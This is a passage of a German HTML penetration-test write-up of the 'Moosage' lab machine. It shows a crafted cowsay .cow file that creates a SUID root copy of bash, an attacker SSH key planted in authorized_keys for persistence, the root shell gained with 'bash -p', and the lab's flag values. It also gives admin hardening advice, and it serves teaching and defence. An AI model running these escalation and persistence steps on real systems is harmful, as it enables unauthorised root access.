+			            <p class="analysis"><strong>Analyse:</strong> Als Benutzer `baca` wird nach Wegen zur Privilegieneskalation gesucht. Ein potenzieller Vektor involviert das Programm `cowsay`. Hier wird versucht, eine benutzerdefinierte `cowsay`-Datei (`cower.cow`) im Verzeichnis `/usr/share/cowsay/cows` zu erstellen. Der Inhalt dieser Datei soll einen Befehl enthalten, der `/bin/bash` nach `/tmp/bash` kopiert und das SUID-Bit für diese Kopie setzt (`chmod +s`). Das SUID-Bit bewirkt, dass das Programm immer mit den Rechten des Dateibesitzers (hier wahrscheinlich `root`, wenn der Exploit funktioniert) ausgeführt wird, unabhängig davon, wer es startet.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- cd /usr/share/cowsay/cows  (Impliziert oder vorher ausgeführt) -->
+                    <div class="prompt">baca@moosage:/usr/share/cowsay/cows$ <span class="command">echo "\$the_cow = \$(cp /bin/bash /tmp/bash && chmod +s /tmp/bash)" > cower.cow</span></div>
+                    <!-- Zweiter Versuch mit anderem Pfad, möglicherweise Korrektur? -->
+                    <div class="prompt">baca@moosage:~$ <span class="command">echo "\$the_cow = \$(cp /bin/bash /tmp/bash && chmod +s /tmp/bash)" > /usr/share/cowsay/cows/cower.cow</span></div>
+                </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Befehle zielen darauf ab, eine Schwachstelle auszunutzen, bei der `cowsay` (oder ein verwandtes Skript, das es aufruft) benutzerdefinierte `.cow`-Dateien unsicher verarbeitet und den darin enthaltenen Code ausführt, möglicherweise mit erhöhten Rechten. Der doppelte Backslash vor `$the_cow` und `$(...)` ist wahrscheinlich notwendig, um das Dollarzeichen und die Command Substitution korrekt in die Datei zu schreiben. Wenn ein Prozess (z.B. ein Cronjob oder ein anderes Skript, das als Root läuft) `cowsay` mit dieser manipulierten `cower.cow`-Datei aufruft, wird der Befehl `cp /bin/bash /tmp/bash && chmod +s /tmp/bash` als Root ausgeführt. Dies würde eine SUID-Root-Shell in `/tmp/bash` erstellen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Nachdem die `cower.cow`-Datei erstellt wurde, muss der Mechanismus gefunden werden, der `cowsay` mit dieser Datei und erhöhten Rechten aufruft. Dies könnte ein Cronjob, ein Login-Skript (MOTD) oder eine andere automatisierte Aufgabe sein. Überprüfen Sie Cronjobs (`crontab -l`, Dateien in `/etc/cron.*`), Systemd Timer (`systemctl list-timers`) und Login-Skripte (`/etc/profile`, `/etc/motd`, etc.). Sobald der Trigger gefunden und ausgelöst wurde, kann `/tmp/bash -p` ausgeführt werden, um eine Root-Shell zu erhalten.
+<br><strong>Empfehlung (Admin):** Programme wie `cowsay` sollten nicht mit erhöhten Rechten ausgeführt werden, insbesondere wenn sie benutzerdefinierte Dateien aus unsicheren Orten laden können. Überprüfen Sie, welcher Prozess `cowsay` aufruft, und stellen Sie sicher, dass er mit minimalen Rechten läuft. Dateiberechtigungen für Verzeichnisse wie `/usr/share/cowsay/cows` sollten so gesetzt werden, dass normale Benutzer keine Dateien darin erstellen oder ändern können. Das SUID-Bit sollte nur für absolut notwendige Systembinärdateien gesetzt sein; überwachen Sie das System auf neu erstellte SUID-Dateien.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Parallel oder alternativ zur `cowsay`-Methode wird versucht, einen SSH-Zugang für den Benutzer `baca` einzurichten. Dies dient oft der Bequemlichkeit oder Persistenz. Dazu wird ein SSH-Public-Key des Angreifers in die Datei `~/.ssh/authorized_keys` des Benutzers `baca` auf dem Zielsystem geschrieben. Der verwendete Key ist ein langer RSA-Key.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Befehle werden als baca ausgeführt -->
+                    <div class="prompt">baca@moosage:/tmp$ <span class="command">mkdir .ssh</span></div>
+                    <div class="prompt">baca@moosage:/tmp$ <span class="command">chmod 755 .ssh</span></div> <!-- Korrekter wäre chmod 700 -->
+                     <!-- Langer echo-Befehl zum Schreiben des Keys -->
+                    <div class="prompt">baca@moosage:/tmp$ <span class="command">echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+t9aZRzpWqjG/8jEgTtJ7rjMnE9R6N7Uj8o8eNzMoqrRYgPVCuZaEL7DVexD7AxqQNsbYW33QZqt1cEXbeFwm2/ywitP2inVxi99mOZym+51z33LWkzPecnuCWyzkhvjYUZUeHCH5zXSJ/C5q5CN5cYpbJlHHO5EBzzZOSklYl6EulNE+SjiN4cItaKnKtf7biM2dlAIifAv8vRwhbY8Y+eyz21v+O1tC4SeAS5ipNq1qfaZFtemWjATtfYLtbVNnhUbb/B6YF925beHXsbGikTdYSnzakBIoPWOdXJvCw0NxDsEnciLvYA63Y+gqszc6EGnicyc9BjUsuF2upnTZ+8llJRpdgqr6gdoQKz74nzvZOGzqeb53/DC5shZZc56FUEgKEIQF8NrVY6hdFByHcE4of5WkjbX+FN8sBXm82pIZrsUmEuh0XsOHdNw3mzK1xJ+w8K6wQUsYhMkFe38rWKGBmwu9XzWE/XrP/w5/h1KklWxXhn0nSCQCCvVxOdE=" > ~/.ssh/authorized_keys</span></div>
+                    <div class="prompt">baca@moosage:/tmp$ <span class="command">chmod 644 ~/.ssh/authorized_keys</span></div> <!-- Korrekter wäre chmod 600 -->
+                    <div class="prompt">baca@moosage:/tmp$ <span class="command">cd ~</span></div>
+                    <div class="prompt">baca@moosage:~$ <span class="command">cd .ssh</span></div>
+                    <div class="prompt">baca@moosage:~/.ssh$ <span class="command">ls -la</span></div>
+                    <pre>
+total 16
+<span class="command">drwxr-xr-x 2 baca baca 4096 Oct  2 19:36 .</span>
+<span class="command">drwxr-xr-x 4 baca baca 4096 Oct  2 19:35 ..</span>
+<span class="command">-rw-r--r-- 1 baca baca  553 Oct  2 20:10 authorized_keys</span>
+<span class="command">-rw-r--r-- 1 baca baca  222 Oct  2 19:36 known_hosts</span>
+</pre>
+                    <!-- Erneutes Setzen der Berechtigungen, vielleicht zur Korrektur -->
+                    <div class="prompt">baca@moosage:~/.ssh$ <span class="command">chmod 644 authorized_keys</span></div>
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Befehle erstellen das `.ssh`-Verzeichnis und schreiben den Public Key des Angreifers in die `authorized_keys`-Datei. Die Berechtigungen werden gesetzt (`chmod 755` für das Verzeichnis und `chmod 644` für die Datei). Striktere SSH-Konfigurationen erfordern oft `chmod 700` für `.ssh` und `chmod 600` für `authorized_keys`, aber `644` funktioniert oft auch. Dies ermöglicht dem Angreifer nun, sich per SSH als Benutzer `baca` mit seinem privaten Schlüssel anzumelden, ohne ein Passwort eingeben zu müssen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Testen Sie den SSH-Login vom Angreifer-System aus (`ssh -i /pfad/zum/private_key baca@moos.hmv`). Dies bietet eine stabile und bequeme Shell für die weitere Privilegieneskalation.
+<br><strong>Empfehlung (Admin):** Überwachen Sie die Erstellung und Änderung von `.ssh/authorized_keys`-Dateien. In Umgebungen mit hohen Sicherheitsanforderungen kann die Verwendung von `authorized_keys` zentral verwaltet oder eingeschränkt werden. Stellen Sie sicher, dass die Dateiberechtigungen im Home-Verzeichnis und im `.ssh`-Verzeichnis korrekt und restriktiv gesetzt sind (`chmod 700` für `.ssh`, `chmod 600` für `authorized_keys`).</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿cyber)-[~]
+ └─# <span class="command">ssh baca@moos.hmv</span></div>
+                     <pre>
+Enter passphrase for key '/root/.ssh/id_rsa': benni <!-- Falsche Eingabe oder anderer Key -->
+</pre>
+                      <!-- Login wird erneut versucht, diesmal erfolgreich -->
+<div class="prompt">
+┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh baca@192.168.2.111</span></div>
+                       <pre>
+Enter passphrase for key '/root/.ssh/id_rsa': <!-- Annahme: Korrekte Passphrase oder passender Key ohne Passphrase verwendet -->
+ ___________________________
+< WELCOME TO MOOSAGE SYSTEM >
+ ---------------------------
+        \   ^__^
+         \  (oo)\_______
+            (__)\       )\/\
+                ||----w |
+                ||     ||
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun Oct  2 20:31:51 2022 from 192.168.2.140
+</pre>
+                    <div class="prompt">baca@moosage:~$</div>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Vom Angreifer-System wird versucht, sich per SSH als Benutzer `baca` auf dem Zielsystem (`moos.hmv` bzw. `192.168.2.111`) anzumelden. Es wird eine Passphrase für den privaten Schlüssel abgefragt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der erste Versuch scheint fehlzuschlagen oder es wird eine Passphrase (`benni`) eingegeben, die nicht passt. Der zweite Versuch mit der IP-Adresse ist erfolgreich. Der Angreifer ist nun per SSH als `baca` angemeldet, wie das Willkommensbanner (inklusive `cowsay`-Ausgabe, was den `cowsay`-Exploit-Vektor interessant macht!) und der Prompt `baca@moosage:~$` zeigen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Die SSH-Verbindung steht. Nun kann der zuvor vorbereitete `cowsay`-Exploit (oder ein anderer gefundener Vektor) ausgelöst bzw. überprüft werden. Das Ziel ist die Ausführung von `/tmp/bash -p`.
+<br><strong>Empfehlung (Admin):** Überwachen Sie SSH-Logins. Die Tatsache, dass ein Login von einer externen IP (`192.168.2.140`) möglich war, nachdem die `authorized_keys`-Datei manipuliert wurde, zeigt die erfolgreiche Kompromittierung des `baca`-Kontos. Die Willkommensnachricht mit `cowsay` sollte überprüft werden – wenn diese als Root läuft und benutzerdefinierte `.cow`-Dateien auswertet, ist dies eine klare Schwachstelle.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">baca@moosage:~$ <span class="command">cd /tmp</span></div>
+                     <div class="prompt">baca@moosage:/tmp$ <span class="command">ls</span></div>
+                     <pre><span class="command">bash</span>  systemd-private-e70f45969a6744b48b7c90f1fc9be6b2-systemd-timesyncd.service-h3YJ0v</pre>
+                     <div class="prompt">baca@moosage:/tmp$ <span class="command">./bash -p</span></div>
+                     <div class="prompt">bash-5.0#</div> <!-- Root-Prompt! -->
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> In der SSH-Sitzung als `baca` wird ins `/tmp`-Verzeichnis gewechselt. Dort befindet sich die Datei `bash`, die zuvor durch den (angenommenen) `cowsay`-Exploit dorthin kopiert und mit dem SUID-Bit versehen wurde. Der Befehl `./bash -p` wird ausgeführt.</p>
+             <p class="evaluation"><strong>Bewertung:** Volltreffer! Der Befehl `./bash -p` startet die SUID-kopierte Bash-Shell. Die Option `-p` ist entscheidend, da sie verhindert, dass Bash die effektiven Root-Rechte beim Starten wieder abgibt. Der resultierende Prompt `bash-5.0#` ist der Standard-Prompt für eine Root-Shell. Die Privilegieneskalation war erfolgreich.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):** Fantastisch, der Root-Zugriff über die SUID-Bash-Datei war erfolgreich! Führen Sie `id` aus, um die Root-Rechte zu bestätigen. Nun können das Root-Flag gelesen und weitere Post-Exploitation-Schritte durchgeführt werden.
+ <br><strong>Empfehlung (Admin):** Die Privilegieneskalation über die SUID-Bash-Datei muss verhindert werden:
+1.  Finden und beheben Sie die ursprüngliche Schwachstelle, die das Erstellen der SUID-Datei ermöglichte (wahrscheinlich der unsichere `cowsay`-Aufruf).
+2.  Überwachen Sie das Dateisystem auf unerwartete SUID/SGID-Dateien, insbesondere in `/tmp` oder anderen beschreibbaren Verzeichnissen.
+3.  Konfigurieren Sie das System so, dass das SUID-Bit auf Mountpoints wie `/tmp` ignoriert wird (Mount-Option `nosuid`).
+4.  Entfernen Sie die schädliche SUID-Datei (`/tmp/bash`).</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">bash-5.0# <span class="command">id</span></div>
+                     <pre><span class="password">uid=1000(baca) gid=1000(baca) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),1000(baca)</span></pre>
+                     <div class="prompt">bash-5.0# <span class="command">cd /root</span></div>
+                     <div class="prompt">bash-5.0# <span class="command">ls</span></div>
+                     <pre>flag.sh  root.txt</pre>
+                     <div class="prompt">bash-5.0# <span class="command">cat root.txt</span></div>
+                     <pre><span class="password">hmvyougotmooooooo</span></pre>
+                     <div class="prompt">bash-5.0#</div>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> In der erhaltenen Root-Shell wird der `id`-Befehl ausgeführt, um die Benutzer- und Gruppen-IDs zu überprüfen. Anschließend wird in das Root-Verzeichnis (`/root`) gewechselt, der Inhalt aufgelistet und die Datei `root.txt` gelesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der `id`-Befehl bestätigt die erfolgreiche Privilegieneskalation: Die effektive User-ID (`euid`) und die effektive Gruppen-ID (`egid`) sind `0 (root)`. Im `/root`-Verzeichnis wird die Datei `root.txt` gefunden und ihr Inhalt, das Root-Flag `<span class="password">hmvyougotmooooooo</span>`, erfolgreich ausgelesen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Das Root-Flag wurde erfolgreich erfasst. Der Pentest ist abgeschlossen. Dokumentieren Sie das Flag und die Schritte zur Privilegieneskalation.
+<br><strong>Empfehlung (Admin):** Die Tatsache, dass das Root-Flag gelesen werden konnte, bestätigt die vollständige Kompromittierung des Systems. Neben der Behebung der spezifischen Schwachstellen sind möglicherweise eine forensische Untersuchung und ein Neuaufsetzen des Systems erforderlich, um sicherzustellen, dass keine Backdoors oder weitere Malware hinterlassen wurden.</p>
+			
+			        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+
+                 <div class="flag-entry">
+                     <div class="flag-command">cat user.txt (oder cat user)</div>
+                     <div class="flag-value"><span class="password">hmvmessageme</span></div>
+                 </div>
+
+                 <div class="flag-entry">
+                     <div class="flag-command">cat root.txt</div>
+                     <div class="flag-value"><span class="password">hmvyougotmooooooo</span></div>
+                 </div>
+             </div>
+        </section> 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Das Datum wurde bereits im vorherigen Schritt korrekt eingefügt -->
+        <p>Berichtsdatum: 13. November 2022</p>
+    </footer>
+</body>
+</html>
